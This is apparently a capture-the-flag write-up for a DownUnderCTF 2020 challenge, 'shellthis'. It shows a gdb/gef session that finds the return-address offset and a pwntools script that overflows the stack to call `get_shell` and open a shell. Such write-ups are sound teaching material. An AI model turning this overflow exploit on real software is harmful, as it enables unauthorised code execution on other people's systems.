This is a simple binary exploitation challenge with a buffer overflow on the stack in the `vuln` function. The binary conveniently has a `get_shell` function you can call to get a shell.

1. Find the offset to the return address. This is easily doable with `gdb` with the `gef` extension. You use the `pattern create` command to get a unique pattern, pass it as input, look at the value in `rbp`, use `pattern offset <rbp_value` to get the offset, and then add 8 to it to get the offset to the return address. This is shown below:

```
$ gdb ./shellthis

gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'

gef➤  run
Starting program: /home/faith/projects/downunderctf/Challenges_2020/pwn/shellthis/publish/shellthis 
Welcome! Can you figure out how to get this program to give you a shell?
Please tell me your name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

// Binary crashes with a SIGSEGV, lots of output
...
$rbp   : 0x6161616161616167 ("gaaaaaaa"?)
...

gef➤  pattern offset 0x6161616161616167
[+] Searching '0x6161616161616167'
[+] Found at offset 48 (little-endian search) likely
[+] Found at offset 41 (big-endian search)
```

2. Now that we've found our offset at 56 (48 + 8), we do a buffer overflow attack. We pass in 56 'A's followed by the address of the `get_shell` function. The exploit script below demonstrates this, and should be self-explanatory:

```python
#!/usr/bin/env python3

from pwn import *

# Load information about the binary
elf = ELF("./shellthis")

# Connect to the remote host, in this case it's just localhost:1337
p = remote("localhost", 1337)

# 56 'A's followed by the address of `get_shell`
payload = b"A"*56 + p64(elf.sym["get_shell"])

# Receive the text from the program, and send the payload
p.recv()
p.sendline(payload)

# Get an interactive shell
p.interactive()
```
